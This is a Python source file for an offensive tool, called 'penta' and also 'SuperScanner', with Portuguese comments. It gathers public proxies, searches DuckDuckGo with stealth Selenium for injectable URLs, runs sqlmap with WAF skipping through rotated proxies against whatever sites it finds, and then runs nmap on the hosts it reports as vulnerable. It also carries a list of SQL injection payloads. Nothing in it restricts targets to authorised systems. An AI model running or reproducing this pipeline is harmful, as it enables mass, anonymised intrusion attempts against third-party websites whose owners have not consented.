#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
penta - Pentest Automation Tool (v1.0.0)

Repositório: https://github.com/FuturoDevJunior/penta
By: linkedin.com/in/devferreirag

Ferramenta automatizada para coleta de proxies, dorking, testes SQLi e
varredura Nmap. Gera relatórios detalhados para profissionais de segurança
ofensiva.

Principais funcionalidades:
- Busca e validação de proxies
- Dorking automatizado (DuckDuckGo + Selenium Stealth)
- Testes SQLi com sqlmap
- Varredura de hosts vulneráveis com Nmap
- Relatórios JSON
- Interface colorida (Rich) com fallback para modo texto

Requisitos:
- Python 3.8+
- Google Chrome
- sqlmap e nmap instalados no PATH
- Dependências Python em requirements.txt

Uso:
    python scanner.py

Versão: 1.0.0

"""

import os
import re
import time
import json
import queue
import random
import threading
import subprocess
import urllib3
import traceback
from datetime import datetime
from threading import Lock
from urllib.parse import urlparse
import requests

# --- Desabilitar warnings SSL (requests urllib3) ---
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# --- Import Rich com fallback ---
class ConsoleFallback:
    def print(self, *a, **k):
        print(" ".join(map(str, a)))

    def rule(self, t=""):
        print(f"--- {t} ---")

    def line(self, *a, **k):
        pass


class TableFallback:
    def __init__(self, *a, **k):
        pass

    def add_column(self, *a, **k):
        pass

    def add_row(self, *a, **k):
        pass

    def __str__(self):
        return "Tabela indisponível"


try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.live import Live
    RICH_AVAILABLE = True
    console = Console(stderr=True, highlight=False, log_time_format="[%X]")
except ImportError:
    print("[AVISO] 'rich' não instalado. Interface simplificada ativada.")
    RICH_AVAILABLE = False
    console = ConsoleFallback()
    Table = TableFallback
    Panel = print
    Progress = Live = None


# --- Cores fallback se não usar rich ---
class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    END = "\033[0m"


# --- Import Selenium com stealth ---
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    SELENIUM_AVAILABLE = True
    try:
        from selenium_stealth import stealth as selenium_stealth
        SELENIUM_STEALTH_AVAILABLE = True
    except ImportError:
        SELENIUM_STEALTH_AVAILABLE = False
        console.print(
            "[yellow][AVISO] selenium-stealth não encontrado. "
            "Instale com: pip install selenium-stealth[/yellow]"
        )
except ImportError:
    SELENIUM_AVAILABLE = False
    console.print(
        "[bold red][ERRO FATAL] selenium não encontrado. "
        "Instale com: pip install selenium[/bold red]"
    )

# --- Import DuckDuckGo Search fallback (não usado no modo stealth) ---
try:
    from duckduckgo_search import DDGS

    DUCKDUCKGO_AVAILABLE = True
except ImportError:
    DUCKDUCKGO_AVAILABLE = False

# --- Import BeautifulSoup fallback ---
try:
    from bs4 import BeautifulSoup

    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False
    console.print(
        "[yellow][AVISO] beautifulsoup4 não encontrado. "
        "Instale com: pip install beautifulsoup4[/yellow]"
    )

# --- Variáveis e configurações globais ---
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) "
    "Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) "
    "Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) "
    "Gecko/20100101 Firefox/126.0",
]
DEFAULT_CACHE_DIR = ".super_scanner_cache"
DEFAULT_SQLMAP_THREADS = 7
DEFAULT_SQLI_CHECK_THREADS = 30
DEFAULT_MAX_RESULTS_PER_DORK = 15
DEFAULT_DORK_FILE = "dorks.txt"
DEFAULT_OUTPUT_FILE_SQLI = "vulnerable_sqli.txt"
DEFAULT_NMAP_OUTPUT_DIR = "nmap_output"
DEFAULT_SQLMAP_OUTPUT_DIR = "sqlmap_output"
DEFAULT_DELAY_DORKS = 3.5  # segundos entre dorks para evitar bans
DEFAULT_PROXY_BLACKLIST_DURATION = 300  # seg
DEFAULT_MAX_PROXY_FAILS = 3
DEFAULT_MAX_PROXIES_TO_TEST = 7000
DEFAULT_TARGET_WORKING_PROXIES = 120
WORKING_PROXIES_CACHE_FILE = ".working_proxies_cache.json"
CACHE_PROXY_TTL_HOURS = 24
SELENIUM_PAGE_LOAD_TIMEOUT = 120
SELENIUM_IMPLICIT_WAIT = 30

SQLI_PAYLOADS = [
    "'",
    '"',
    "`",
    "%27",
    " OR 1=1 -- -",
    " OR '1'='1#",
    " OR `1`=`1` /*",
    " AND SLEEP(5) -- -",
    " UNION SELECT @@VERSION,NULL -- -",
    "'; WAITFOR DELAY '0:0:5'--",
    " ORDER BY 5-- -",
]

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=elite",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://api.openproxylist.xyz/http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/"
    "proxies-http.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/"
    "http_proxies.txt",
    "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
    "https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
    "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/\u30a6\u30a9\u30eb\u30bf\u30fc\u30db\u30ef\u30a4\u30c8/proxy-list/main/http.txt",
]

SQL_ERROR_PATTERNS = [
    re.compile(p, re.I)
    for p in [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"ORA-[0-9]{4,}",
        r"Unclosed quotation mark",
        r"error in your SQL syntax",
        r"Microsoft OLE DB Provider",
        r"PostgreSQL.*ERROR",
        r"SQLite error",
        r"Syntax error converting the varchar value",
        r"MySqlClient\.",
        r"SqlCommand",
        r"JdbcSQLException",
        r"DB2 SQL error",
        r"Sybase message:",
        r"Unterminated string constant",
        r"unterminated quoted string",
        r"Invalid SQL statement",
    ]
]

SCANNED_HOSTS_NMAP = set()
PRINT_LOCK = Lock()

# Flags para dependências externas
SQLMAP_AVAILABLE = False
NMAP_AVAILABLE = False


# Verifica sqlmap e nmap no PATH
def check_external_tools():
    """Verifica se sqlmap e nmap estão disponíveis no PATH do sistema."""
    global SQLMAP_AVAILABLE, NMAP_AVAILABLE
    try:
        subprocess.run(["sqlmap", "--version"], capture_output=True, timeout=7)
        SQLMAP_AVAILABLE = True
    except Exception:
        console.print(
            "[yellow][AVISO] sqlmap não encontrado no PATH. "
            "Instale e configure antes de rodar os testes SQLi.[/yellow]"
        )
    try:
        subprocess.run(["nmap", "-v"], capture_output=True, timeout=7)
        NMAP_AVAILABLE = True
    except Exception:
        console.print(
            "[yellow][AVISO] nmap não encontrado no PATH. "
            "Instale para escanear hosts vulneráveis após testes SQLi.[/yellow]"
        )


# Logging com cores e timestamp
def log_message(tag, message, style="white", always_print=False):
    """Exibe mensagens de log com timestamp e cor, usando Rich se disponível."""
    with PRINT_LOCK:
        timestamp = datetime.now().strftime("%H:%M:%S")
        if RICH_AVAILABLE:
            console.print(
                f"[dim]{timestamp}[/dim] [{style}]{tag}[/{style}] {message}"
            )
        else:
            color = getattr(Colors, style.upper(), "")
            print(f"{color}[{timestamp}] [{tag}] {message}{Colors.END}")


# Banner
def banner():
    logo = r"""
   _____                      _____                                  
  / ____|                    / ____|                                 
 | (___   ___ ___  _ __ ___ | (___   ___  ___ _   _ _ __ ___  _ __  
  \___ \ / __/ _ \| '_ ` _ \ \___ \ / _ \/ __| | | | '_ ` _ \| '_ \ 
  ____) | (_| (_) | | | | | |____) |  __/ (__| |_| | | | | | | |_) |
 |_____/ \___\___/|_| |_| |_|_____/ \___|\___|\__,_|_| |_| |_| .__/ 
                                                             | |    
                                                             |_|    
    """
    credit = "By linkedin.com/in/devferreirag"
    if RICH_AVAILABLE:
        console.rule("[bold blue]SuperScanner Pentest Tool[/bold blue]")
        console.print(f"[cyan]{logo}[/cyan]")
        console.print(f"[bold green]{credit}[/bold green]")
        console.rule()
    else:
        print("--- SuperScanner Pentest Tool ---")
        print(logo)
        print(credit)
        print("------------------------------")


# --- Proxy Download & Test --- #
def fetch_proxies():
    """Baixa proxies de múltiplas fontes e retorna uma lista única."""
    proxies = set()
    log_message("INFO", "Iniciando download de proxies públicos...")
    for url in PROXY_SOURCES:
        try:
            response = requests.get(url, timeout=15)
            if response.status_code == 200:
                lines = response.text.splitlines()
                for line in lines:
                    proxy_line = line.strip()
                    if proxy_line and re.match(r"^\d{1,3}(\.\d{1,3}){3}:\d+$", proxy_line):
                        proxies.add(proxy_line)
                log_message("INFO", f"Baixados {len(lines)} proxies de: {url}")
            else:
                log_message(
                    "WARN",
                    f"Falha ao baixar proxies de: {url} (Status {response.status_code})",
                )
        except Exception as exc:
            log_message("ERROR", f"Erro ao baixar proxies de: {url} - {exc}")
    log_message(
        "INFO", f"Total de proxies coletados (duplicatas removidas): {len(proxies)}"
    )
    return list(proxies)


def test_proxy(proxy, timeout=10):
    """Testa se um proxy HTTP está funcional usando requests."""
    proxies = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}",
    }
    test_url = "http://httpbin.org/ip"
    try:
        response = requests.get(test_url, proxies=proxies, timeout=timeout, verify=False)
        if response.status_code == 200:
            origin_ip = response.json().get("origin", "")
            if origin_ip:
                return True
    except Exception:
        pass
    return False


def test_proxies_threaded(proxies, max_workers=40):
    """Testa proxies em paralelo usando threads e retorna os funcionais."""
    log_message("INFO", f"Iniciando teste dos proxies em até {max_workers} threads...")
    working_proxies = []
    proxy_queue = queue.Queue()
    for proxy in proxies:
        proxy_queue.put(proxy)

    def worker():
        while not proxy_queue.empty():
            proxy = None
            try:
                proxy = proxy_queue.get_nowait()
            except queue.Empty:
                return
            if test_proxy(proxy):
                with PRINT_LOCK:
                    working_proxies.append(proxy)
                    if RICH_AVAILABLE:
                        console.print(f"[green][PROXY OK][/green] {proxy}")
                    else:
                        print(f"[PROXY OK] {proxy}")
            proxy_queue.task_done()

    threads = []
    for _ in range(max_workers):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    log_message("INFO", f"Proxies funcionando: {len(working_proxies)}")
    return working_proxies


def save_working_proxies(proxies, filename=WORKING_PROXIES_CACHE_FILE):
    """Salva proxies funcionais em cache local com timestamp."""
    with open(filename, "w") as f:
        json.dump({"proxies": proxies, "timestamp": time.time()}, f)


def load_working_proxies(filename=WORKING_PROXIES_CACHE_FILE):
    """Carrega proxies funcionais do cache, se não expirado."""
    if not os.path.isfile(filename):
        return []
    with open(filename, "r") as f:
        try:
            data = json.load(f)
            timestamp = data.get("timestamp", 0)
            if time.time() - timestamp > CACHE_PROXY_TTL_HOURS * 3600:
                return []
            return data.get("proxies", [])
        except Exception:
            return []


# --- DuckDuckGo Selenium Stealth Dorking --- #
def setup_selenium_driver(headless=True):
    """Configura e retorna um driver Selenium Chrome com stealth, se disponível."""
    if not SELENIUM_AVAILABLE:
        log_message("ERROR", "Selenium não está disponível.")
        return None
    options = Options()
    options.headless = headless
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-infobars")
    options.add_argument("--disable-extensions")
    options.add_argument("--start-maximized")
    options.add_argument("--ignore-certificate-errors")
    options.add_argument(f"user-agent={random.choice(DEFAULT_USER_AGENTS)}")
    driver = None
    try:
        driver = webdriver.Chrome(options=options)
        driver.set_page_load_timeout(SELENIUM_PAGE_LOAD_TIMEOUT)
        driver.implicitly_wait(SELENIUM_IMPLICIT_WAIT)
        if SELENIUM_STEALTH_AVAILABLE:
            selenium_stealth(
                driver,
                languages=["en-US", "en"],
                vendor="Google Inc.",
                platform="Win32",
                webgl_vendor="Intel Inc.",
                renderer="Intel Iris OpenGL Engine",
                fix_hairline=True,
            )
        log_message("INFO", "Chrome Selenium driver iniciado com stealth")
    except Exception as exc:
        log_message("ERROR", f"Falha ao iniciar driver Selenium: {exc}")
    return driver


def dork_duckduckgo_selenium(dork, max_results=DEFAULT_MAX_RESULTS_PER_DORK):
    """Realiza busca dorking no DuckDuckGo usando Selenium Stealth."""
    if not SELENIUM_AVAILABLE:
        log_message("ERROR", "Selenium não disponível para dorking")
        return []
    driver = setup_selenium_driver(headless=True)
    if not driver:
        return []
    results = []
    base_url = (
        f"https://duckduckgo.com/?q={requests.utils.quote(dork)}&t=h_&ia=web"
    )
    log_message("INFO", f"Iniciando busca DuckDuckGo para dork: {dork}")
    try:
        driver.get(base_url)
        time.sleep(2)
        last_height = driver.execute_script("return document.body.scrollHeight")
        scroll_tries = 0
        while len(results) < max_results and scroll_tries < 10:
            soup = BeautifulSoup(driver.page_source, "html.parser")
            links = soup.select("a.result__a")
            for anchor in links:
                href = anchor.get("href")
                if href and href not in results:
                    results.append(href)
                    if len(results) >= max_results:
                        break
            driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
            time.sleep(3)
            new_height = driver.execute_script("return document.body.scrollHeight")
            if new_height == last_height:
                scroll_tries += 1
            else:
                scroll_tries = 0
                last_height = new_height
    except Exception as exc:
        log_message("ERROR", f"Erro durante dorking Selenium: {exc}")
    finally:
        driver.quit()
    log_message("INFO", f"Resultados coletados: {len(results)}")
    return results[:max_results]


# --- SQL Injection Check via sqlmap --- #


def run_sqlmap_on_url(url, proxy=None, timeout=90, threads=DEFAULT_SQLMAP_THREADS):
    """Executa sqlmap CLI para testar a URL com SQLi, retorna True se vulnerável."""
    if not SQLMAP_AVAILABLE:
        log_message("ERROR", "sqlmap não disponível, ignorando teste SQLi.")
        return False
    command = [
        "sqlmap", "-u", url, "--batch", "--level=2", "--risk=2",
        "--threads", str(threads), "--random-agent", "--flush-session",
        "--fresh-queries", "--skip-waf", "--timeout", "15",
        "--technique", "BEUSTQ",
    ]
    if proxy:
        command += ["--proxy", f"http://{proxy}"]
    command += ["--stop-on-shell", "--stop-on-banner"]
    log_message("SQLMAP", f"Executando sqlmap em {url} via proxy {proxy or 'N/A'}")
    try:
        proc = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout,
            text=True,
        )
        output = proc.stdout + proc.stderr
        if re.search(r"SQL injection", output, re.I) or re.search(
            r"is vulnerable", output, re.I
        ):
            log_message("SQLMAP", f"Vulnerabilidade encontrada em: {url}")
            return True
    except subprocess.TimeoutExpired:
        log_message("SQLMAP", f"Timeout ao executar sqlmap em: {url}")
    except Exception as exc:
        log_message("SQLMAP", f"Erro ao executar sqlmap: {exc}")
    return False


def sqlmap_worker(url_queue, results_list, proxies, max_threads=DEFAULT_SQLMAP_THREADS):
    """Worker para execução paralela de testes SQLi via sqlmap."""
    while True:
        try:
            url = url_queue.get_nowait()
        except queue.Empty:
            break
        proxy = None
        if proxies:
            proxy = random.choice(proxies)
        try:
            vulnerable = run_sqlmap_on_url(url, proxy=proxy, threads=max_threads)
            if vulnerable:
                results_list.append(url)
        except Exception as exc:
            log_message("SQLMAP", f"Erro worker sqlmap em {url}: {exc}")
        finally:
            url_queue.task_done()


# --- Nmap Scan --- #
def nmap_scan(host, output_dir=DEFAULT_NMAP_OUTPUT_DIR):
    """Executa varredura Nmap em um host e salva o resultado em arquivo."""
    if not NMAP_AVAILABLE:
        log_message("WARN", f"nmap não disponível, pulando scan de {host}")
        return None
    try:
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        output_file = os.path.join(
            output_dir, f"nmap_{host.replace('.', '_')}.txt"
        )
        cmd = ["nmap", "-sV", "-T4", "-oN", output_file, host]
        log_message("NMAP", f"Executando nmap scan em {host}")
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        if proc.returncode == 0:
            return output_file
        else:
            log_message(
                "NMAP", f"Erro nmap scan em {host}: {proc.stderr.strip()}"
            )
            return None
    except Exception as exc:
        log_message("NMAP", f"Erro ao executar nmap: {exc}")
        return None


# --- Função principal --- #
def main():
    """Fluxo principal de execução do SuperScanner."""
    banner()
    check_external_tools()

    # 1. Proxy fetch e teste
    working_proxies = load_working_proxies()
    if not working_proxies:
        proxies = fetch_proxies()
        if len(proxies) > DEFAULT_MAX_PROXIES_TO_TEST:
            proxies = proxies[:DEFAULT_MAX_PROXIES_TO_TEST]
        working_proxies = test_proxies_threaded(proxies, max_workers=50)
        save_working_proxies(working_proxies)
    log_message("INFO", f"Proxies prontos para uso: {len(working_proxies)}")

    # 2. Ler dorks do arquivo (se existir)
    if os.path.isfile(DEFAULT_DORK_FILE):
        with open(DEFAULT_DORK_FILE, "r", encoding="utf-8") as f:
            dorks = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
    else:
        log_message(
            "WARN",
            f"Arquivo de dorks '{DEFAULT_DORK_FILE}' não encontrado, usando dorks padrão.",
        )
        dorks = [
            "inurl:index.php?id=",
            "inurl:product.php?id=",
            "inurl:news.php?id=",
        ]

    # 3. Buscar URLs via dorking
    all_urls = []
    for dork in dorks:
        time.sleep(DEFAULT_DELAY_DORKS)
        if SELENIUM_AVAILABLE:
            urls = dork_duckduckgo_selenium(
                dork, max_results=DEFAULT_MAX_RESULTS_PER_DORK
            )
            all_urls.extend(urls)
        elif DUCKDUCKGO_AVAILABLE:
            log_message("INFO", "Buscando via duckduckgo_search (fallback)...")
            with DDGS() as ddgs:
                results = ddgs.text(dork, max_results=DEFAULT_MAX_RESULTS_PER_DORK)
                urls = [r["href"] for r in results if "href" in r]
                all_urls.extend(urls)
        else:
            log_message("WARN", "Nenhuma forma de realizar dorking disponível.")
            break
    all_urls = list(set(all_urls))
    log_message("INFO", f"Total URLs coletadas: {len(all_urls)}")

    # 4. Teste de SQLi paralelo via sqlmap
    if not SQLMAP_AVAILABLE:
        log_message("WARN", "sqlmap não disponível. Pulando testes de SQL Injection.")
        vulnerable_urls = []
    else:
        url_queue = queue.Queue()
        for url in all_urls:
            url_queue.put(url)
        vulnerable_urls = []
        threads = []
        for _ in range(DEFAULT_SQLI_CHECK_THREADS):
            t = threading.Thread(
                target=sqlmap_worker, args=(url_queue, vulnerable_urls, working_proxies)
            )
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

    log_message("INFO", f"URLs vulneráveis a SQL Injection: {len(vulnerable_urls)}")

    # 5. Escanear hosts vulneráveis com nmap
    if NMAP_AVAILABLE and vulnerable_urls:
        for url in vulnerable_urls:
            host = extract_host(url)
            if host and host not in SCANNED_HOSTS_NMAP:
                SCANNED_HOSTS_NMAP.add(host)
                nmap_scan(host)

    # 6. Salvar relatório JSON
    report = {
        "timestamp": datetime.now().isoformat(),
        "proxies_working": working_proxies,
        "urls_dorked": all_urls,
        "urls_sqli_vulnerable": vulnerable_urls,
    }
    with open("super_scanner_report.json", "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)

    log_message("INFO", "Relatório salvo em super_scanner_report.json")
    log_message("INFO", "Execução finalizada.")


# Função auxiliar para extrair host
def extract_host(url):
    """Extrai o host de uma URL usando urlparse."""
    try:
        parsed = urlparse(url)
        if parsed.netloc:
            return parsed.netloc
        else:
            return None
    except Exception:
        return None


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log_message("INFO", "Execução interrompida pelo usuário.")
    except Exception:
        log_message("ERROR", "Erro fatal na execução:")
        traceback.print_exc()
